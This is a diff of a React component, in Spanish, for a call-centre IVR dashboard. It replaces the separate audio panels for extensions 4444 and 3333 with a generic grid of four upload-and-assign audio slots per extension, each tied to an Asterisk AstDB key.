-                    <span className="px-2.5 py-0.5 rounded-full text-xs font-bold bg-emerald-500 text-slate-950 shadow-sm">
-                      Extensión OTP 4444
-                    </span>
-                  </div>
-                  <p className="text-xs text-emerald-200/80 mt-1">
-                    Audio reproducido al cliente cuando transfieres a la 4444: <span className="font-semibold text-white">Mismas características que la 7777 con locución independiente</span>.
-                  </p>
-                </div>
-              </div>
-
-              <div className="flex items-center gap-2 shrink-0">
-                <input
-                  type="file"
-                  ref={ext4444FileInputRef}
-                  onChange={(e) => {
-                    if (e.target.files && e.target.files[0]) {
-                      handleUpload4444Direct(e.target.files[0]);
-                    }
-                  }}
-                  accept="audio/*,.wav,.mp3,.ogg,.gsm"
-                  className="hidden"
-                />
-                <button
-                  onClick={() => ext4444FileInputRef.current?.click()}
-                  disabled={isUploading4444}
-                  className="inline-flex items-center space-x-2 px-5 py-2.5 rounded-xl text-sm font-bold bg-emerald-500 hover:bg-emerald-400 text-slate-950 shadow-lg shadow-emerald-500/30 transition-all transform active:scale-95 disabled:opacity-50"
-                >
-                  <UploadCloud className="w-4 h-4" />
-                  <span>{isUploading4444 ? 'Subiendo y Activando...' : 'Cargar Audio para Extensión 4444'}</span>
-                </button>
-              </div>
-            </div>
-
-            {/* Zona de estado y selector rápido para la 4444 */}
-            <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 pt-1">
-              <div className="lg:col-span-2 p-4 rounded-xl bg-slate-950/80 border border-emerald-500/30 space-y-2.5">
-                <div className="flex items-center justify-between text-xs">
-                  <span className="text-slate-300 font-semibold">Audio asignado a la 4444 / 444:</span>
-                  <span className="font-mono text-emerald-300 font-bold bg-emerald-950/60 px-2 py-0.5 rounded border border-emerald-800/50">
-                    {activeAssignments.welcome_4444 || 'custom/bienvenida_4444'}
+              {/* Mensaje de aislamiento garantizado */}
+              <div className="flex items-center justify-between gap-2 p-2.5 rounded-xl bg-slate-950/70 border border-slate-800 text-xs">
+                <div className="flex items-center gap-2 text-slate-300">
+                  <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0" />
+                  <span>
+                    <strong>Canal Exclusivo Ext. {extInfo.extension}:</strong> Los 4 audios asignados aquí solo se reproducen cuando el agente transfiere a la extensión <span className="font-mono text-white font-bold">{extInfo.extension}</span> o <span className="font-mono text-white font-bold">{extInfo.shortExt}</span>. No hay cruces de audios con otras extensiones.
                   </span>
                 </div>
-
-                <div className="flex items-center gap-2">
-                  <select
-                    value={activeAssignments.welcome_4444 || 'custom/bienvenida_4444'}
-                    disabled={isSyncingRole.welcome_4444}
-                    onChange={(e) => handleAssignRoleDirect('welcome_4444', e.target.value)}
-                    className="flex-1 px-3 py-2 rounded-lg bg-slate-900 border border-emerald-500/40 text-slate-100 text-xs font-mono focus:border-emerald-400 focus:outline-none"
-                  >
-                    {audios.map((a) => (
-                      <option key={a.id} value={a.asteriskPath}>
-                        {a.name} ({a.asteriskPath})
-                      </option>
-                    ))}
-                  </select>
-
-                  <button
-                    onClick={() => handlePlayByPath(activeAssignments.welcome_4444 || 'custom/bienvenida_4444')}
-                    className="px-3.5 py-2 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-slate-950 text-xs font-semibold flex items-center gap-1.5 shadow-md shadow-emerald-600/20"
-                    title="Escuchar audio actual de la 4444"
-                  >
-                    <Play className="w-3.5 h-3.5" />
-                    <span>Escuchar</span>
-                  </button>
-
-                  <button
-                    onClick={() => handleDeactivateRole('welcome_4444')}
-                    disabled={isSyncingRole.welcome_4444}
-                    className="px-2.5 py-2 rounded-lg bg-slate-800 hover:bg-rose-950/40 text-slate-400 hover:text-rose-400 border border-slate-700 hover:border-rose-500/30 text-xs font-semibold flex items-center gap-1"
-                    title="Desactivar audio actual y restaurar locución predeterminada para la 4444"
-                  >
-                    <PowerOff className="w-3.5 h-3.5" />
-                    <span className="hidden sm:inline">Desactivar</span>
-                  </button>
-                </div>
-
-                <div className="flex items-center justify-between text-[11px] text-slate-400">
-                  <span className="flex items-center gap-1.5 text-emerald-400">
-                    <CheckCircle2 className="w-3.5 h-3.5" />
-                    <span>AstDB: ivr_vars 4444_intro y ivr_vars 4444_prompt</span>
-                  </span>
-                  <span className="text-slate-400">Captura hasta 10 dígitos + tecla #</span>
-                </div>
+                <span className="font-mono text-[10px] text-slate-400 bg-slate-900 px-2 py-0.5 rounded border border-slate-800 shrink-0 hidden md:inline">
+                  AstDB ivr_vars/{extInfo.extension}_*
+                </span>
               </div>
 
-              <div
-                onDragOver={(e) => {
-                  e.preventDefault();
-                  setIsDragging(true);
-                }}
-                onDragLeave={() => setIsDragging(false)}
-                onDrop={(e) => {
-                  e.preventDefault();
-                  setIsDragging(false);
-                  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
-                    handleUpload4444Direct(e.dataTransfer.files[0]);
-                  }
-                }}
-                onClick={() => ext4444FileInputRef.current?.click()}
-                className="p-4 rounded-xl border-2 border-dashed border-emerald-500/40 bg-emerald-950/20 hover:bg-emerald-950/40 hover:border-emerald-400 transition-all flex flex-col items-center justify-center text-center cursor-pointer space-y-1.5"
-              >
-                <UploadCloud className="w-6 h-6 text-emerald-400" />
-                <div className="text-xs font-bold text-white">Arrastra el audio de la 4444 aquí</div>
-                <p className="text-[10px] text-emerald-300/70 leading-tight">
-                  WAV o MP3. Se optimiza y activa en caliente en Asterisk al instante.
-                </p>
-              </div>
-            </div>
-          </div>
-        )}
+              {/* LOS 4 AUDIOS INDIVIDUALES DE ESTA EXTENSIÓN */}
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                {EXTENSION_SLOTS.map((slotMeta) => {
+                  const SlotIcon = slotMeta.icon;
+                  const slotKey = slotMeta.roleKey(extInfo.extension);
+                  const currentPath = activeAssignments[slotKey] || slotMeta.fallbackDefault;
+                  const isSyncing = !!isSyncingRole[slotKey];
+                  const isUploading = !!uploadingSlot[slotKey];
+                  const matchedAudio = audios.find((a) => a.asteriskPath === currentPath.replace(/\.wav$/, ''));
+                  const isPlaying = matchedAudio && playingAudioId === matchedAudio.id;
 
-        {/* PANEL EXTENSIÓN 3333 */}
-        {(featuredExtTab === 'all' || featuredExtTab === '3333') && (
-          <div className="p-6 rounded-2xl bg-gradient-to-br from-pink-950/50 via-slate-900 to-slate-950 border-2 border-pink-500/50 shadow-xl space-y-4">
-            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-pink-500/20">
-              <div className="flex items-start gap-3">
-                <div className="w-11 h-11 rounded-xl bg-pink-500/20 border border-pink-500/40 flex items-center justify-center text-pink-300 shrink-0 shadow-inner">
-                  <Headphones className="w-6 h-6" />
-                </div>
-                <div>
-                  <div className="flex items-center gap-2">
-                    <h3 className="text-base font-bold text-white">
-                      Audio Exclusivo para Extensión 3333 / 333
-                    </h3>
-                    <span className="px-2.5 py-0.5 rounded-full text-xs font-bold bg-pink-500 text-white shadow-sm">
-                      Extensión OTP 3333
-                    </span>
-                  </div>
-                  <p className="text-xs text-pink-200/80 mt-1">
-                    Audio reproducido al cliente cuando transfieres a la 3333: <span className="font-semibold text-white">Mismas características que la 7777 con locución independiente</span>.
-                  </p>
-                </div>
-              </div>
+                  return (
+                    <div
+                      key={slotMeta.slot}
+                      className="p-4 rounded-xl bg-slate-950/80 border border-slate-800 hover:border-slate-700 transition-all flex flex-col justify-between space-y-3.5 shadow-md"
+                    >
+                      {/* Cabecera del Slot */}
+                      <div className="space-y-1">
+                        <div className="flex items-center justify-between gap-2">
+                          <div className="flex items-center gap-2">
+                            <span className="px-2 py-0.5 rounded-md text-[10px] font-extrabold uppercase tracking-wider bg-slate-800 text-slate-200 border border-slate-700">
+                              {slotMeta.badge}
+                            </span>
+                            <span className="font-mono text-[11px] text-indigo-300 font-semibold">
+                              AstDB: {slotMeta.astDbKey(extInfo.extension)}
+                            </span>
+                          </div>
+                          {locked && (
+                            <span className="flex items-center gap-1 text-[10px] text-amber-400 font-medium">
+                              <Lock className="w-2.5 h-2.5" />
+                              <span>Fijado</span>
+                            </span>
+                          )}
+                        </div>
 
-              <div className="flex items-center gap-2 shrink-0">
-                <input
-                  type="file"
-                  ref={ext3333FileInputRef}
-                  onChange={(e) => {
-                    if (e.target.files && e.target.files[0]) {
-                      handleUpload3333Direct(e.target.files[0]);
-                    }
-                  }}
-                  accept="audio/*,.wav,.mp3,.ogg,.gsm"
-                  className="hidden"
-                />
-                <button
-                  onClick={() => ext3333FileInputRef.current?.click()}
-                  disabled={isUploading3333}
-                  className="inline-flex items-center space-x-2 px-5 py-2.5 rounded-xl text-sm font-bold bg-pink-500 hover:bg-pink-400 text-white shadow-lg shadow-pink-500/30 transition-all transform active:scale-95 disabled:opacity-50"
-                >
-                  <UploadCloud className="w-4 h-4" />
-                  <span>{isUploading3333 ? 'Subiendo y Activando...' : 'Cargar Audio para Extensión 3333'}</span>
-                </button>
-              </div>
-            </div>
+                        <div className="flex items-center gap-2 pt-1">
+                          <SlotIcon className="w-4 h-4 text-slate-300 shrink-0" />
+                          <h5 className="text-sm font-bold text-white">
+                            {slotMeta.title}
+                          </h5>
+                        </div>
+                        <p className="text-[11px] text-slate-400 leading-tight">
+                          {slotMeta.description}
+                        </p>
+                      </div>
 
-            {/* Zona de estado y selector rápido para la 3333 */}
-            <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 pt-1">
-              <div className="lg:col-span-2 p-4 rounded-xl bg-slate-950/80 border border-pink-500/30 space-y-2.5">
-                <div className="flex items-center justify-between text-xs">
-                  <span className="text-slate-300 font-semibold">Audio asignado a la 3333 / 333:</span>
-                  <span className="font-mono text-pink-300 font-bold bg-pink-950/60 px-2 py-0.5 rounded border border-pink-800/50">
-                    {activeAssignments.welcome_3333 || 'custom/bienvenida_3333'}
-                  </span>
-                </div>
+                      {/* Selector de Audio y Reproductor */}
+                      <div className="space-y-2">
+                        <div className="flex items-center justify-between text-[11px] text-slate-400">
+                          <span>Audio asignado en Asterisk:</span>
+                          <span className="font-mono text-white font-bold bg-slate-900 px-2 py-0.5 rounded border border-slate-800 truncate max-w-[220px]">
+                            {currentPath}
+                          </span>
+                        </div>
 
-                <div className="flex items-center gap-2">
-                  <select
-                    value={activeAssignments.welcome_3333 || 'custom/bienvenida_3333'}
-                    disabled={isSyncingRole.welcome_3333}
-                    onChange={(e) => handleAssignRoleDirect('welcome_3333', e.target.value)}
-                    className="flex-1 px-3 py-2 rounded-lg bg-slate-900 border border-pink-500/40 text-slate-100 text-xs font-mono focus:border-pink-400 focus:outline-none"
-                  >
-                    {audios.map((a) => (
-                      <option key={a.id} value={a.asteriskPath}>
-                        {a.name} ({a.asteriskPath})
-                      </option>
-                    ))}
-                  </select>
+                        <div className="flex items-center gap-1.5">
+                          <select
+                            value={currentPath}
+                            disabled={isSyncing}
+                            onChange={(e) => handleAssignRoleDirect(slotKey as any, e.target.value)}
+                            className={`flex-1 px-2.5 py-1.5 rounded-lg bg-slate-900 border border-slate-700 text-slate-100 text-xs font-mono focus:outline-none ${extInfo.ringColor}`}
+                          >
+                            {audios.map((a) => (
+                              <option key={a.id} value={a.asteriskPath}>
+                                {a.name} ({a.asteriskPath})
+                              </option>
+                            ))}
+                          </select>
 
-                  <button
-                    onClick={() => handlePlayByPath(activeAssignments.welcome_3333 || 'custom/bienvenida_3333')}
-                    className="px-3.5 py-2 rounded-lg bg-pink-600 hover:bg-pink-500 text-white text-xs font-semibold flex items-center gap-1.5 shadow-md shadow-pink-600/20"
-                    title="Escuchar audio actual de la 3333"
-                  >
-                    <Play className="w-3.5 h-3.5" />
-                    <span>Escuchar</span>
-                  </button>
+                          <button
+                            type="button"
+                            onClick={() => handlePlayByPath(currentPath)}
+                            className="px-2.5 py-1.5 rounded-lg bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-semibold flex items-center gap-1 shadow-md shadow-indigo-600/20 cursor-pointer"
+                            title="Escuchar audio configurado en este slot"
+                          >
+                            {isPlaying ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5" />}
+                            <span className="hidden sm:inline">{isPlaying ? 'Pausa' : 'Oír'}</span>
+                          </button>
 
-                  <button
-                    onClick={() => handleDeactivateRole('welcome_3333')}
-                    disabled={isSyncingRole.welcome_3333}
-                    className="px-2.5 py-2 rounded-lg bg-slate-800 hover:bg-rose-950/40 text-slate-400 hover:text-rose-400 border border-slate-700 hover:border-rose-500/30 text-xs font-semibold flex items-center gap-1"
-                    title="Desactivar audio actual y restaurar locución predeterminada para la 3333"
-                  >
-                    <PowerOff className="w-3.5 h-3.5" />
-                    <span className="hidden sm:inline">Desactivar</span>
-                  </button>
-                </div>
+                          <button
+                            type="button"
+                            onClick={() => triggerFilePicker(extInfo.extension, slotMeta.slot)}
+                            disabled={isUploading}
+                            className="px-2.5 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold flex items-center gap-1 border border-slate-700 cursor-pointer disabled:opacity-50"
+                            title="Subir archivo de audio propio para este slot"
+                          >
+                            {isUploading ? (
+                              <RefreshCw className="w-3.5 h-3.5 animate-spin text-emerald-400" />
+                            ) : (
+                              <UploadCloud className="w-3.5 h-3.5 text-emerald-400" />
+                            )}
+                            <span className="hidden sm:inline">{isUploading ? 'Subiendo...' : 'Subir'}</span>
+                          </button>
 
-                <div className="flex items-center justify-between text-[11px] text-slate-400">
-                  <span className="flex items-center gap-1.5 text-emerald-400">
-                    <CheckCircle2 className="w-3.5 h-3.5" />
-                    <span>AstDB: ivr_vars 3333_intro y ivr_vars 3333_prompt</span>
-                  </span>
-                  <span className="text-slate-400">Captura hasta 10 dígitos + tecla #</span>
-                </div>
-              </div>
+                          <button
+                            type="button"
+                            onClick={() => handleDeactivateRole(slotKey as any)}
+                            disabled={isSyncing}
+                            className="p-1.5 rounded-lg bg-slate-800 hover:bg-rose-950/40 text-slate-400 hover:text-rose-400 border border-slate-700 hover:border-rose-500/30 text-xs cursor-pointer"
+                            title="Restaurar audio predeterminado para este slot"
+                          >
+                            <PowerOff className="w-3.5 h-3.5" />
+                          </button>
+                        </div>
+                      </div>
 
-              <div
-                onDragOver={(e) => {
-                  e.preventDefault();
-                  setIsDragging(true);
-                }}
-                onDragLeave={() => setIsDragging(false)}
-                onDrop={(e) => {
-                  e.preventDefault();
-                  setIsDragging(false);
-                  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
-                    handleUpload3333Direct(e.dataTransfer.files[0]);
-                  }
-                }}
-                onClick={() => ext3333FileInputRef.current?.click()}
-                className="p-4 rounded-xl border-2 border-dashed border-pink-500/40 bg-pink-950/20 hover:bg-pink-950/40 hover:border-pink-400 transition-all flex flex-col items-center justify-center text-center cursor-pointer space-y-1.5"
-              >
-                <UploadCloud className="w-6 h-6 text-pink-400" />
-                <div className="text-xs font-bold text-white">Arrastra el audio de la 3333 aquí</div>
-                <p className="text-[10px] text-pink-300/70 leading-tight">
-                  WAV o MP3. Se optimiza y activa en caliente en Asterisk al instante.
-                </p>
+                      {/* Mini zona de arrastrar y soltar para este slot */}
+                      <div
+                        onDragOver={(e) => e.preventDefault()}
+                        onDrop={(e) => {
+                          e.preventDefault();
+                          if (e.dataTransfer.files && e.dataTransfer.files[0]) {
+                            handleUploadForExtensionSlot(extInfo.extension, slotMeta.slot, e.dataTransfer.files[0]);
+                          }
+                        }}
+                        onClick={() => triggerFilePicker(extInfo.extension, slotMeta.slot)}
+                        className="py-1.5 px-3 rounded-lg border border-dashed border-slate-800 hover:border-slate-600 bg-slate-900/50 hover:bg-slate-900 text-center cursor-pointer transition-all flex items-center justify-center gap-2 text-[10px] text-slate-400 hover:text-slate-300"
+                      >
+                        <UploadCloud className="w-3 h-3 text-slate-400" />
+                        <span>Arrastra un audio WAV aquí o clic para subir directamente a este paso</span>
+                      </div>
+                    </div>
+                  );
+                })}
               </div>
             </div>
-          </div>
-        )}
+          );
+        })}
       </div>
 
       {/* SECTION 2: MATRIZ DE ASIGNACIÓN EN VIVO (CAMBIAR AUDIOS EN 1 CLIC) */}
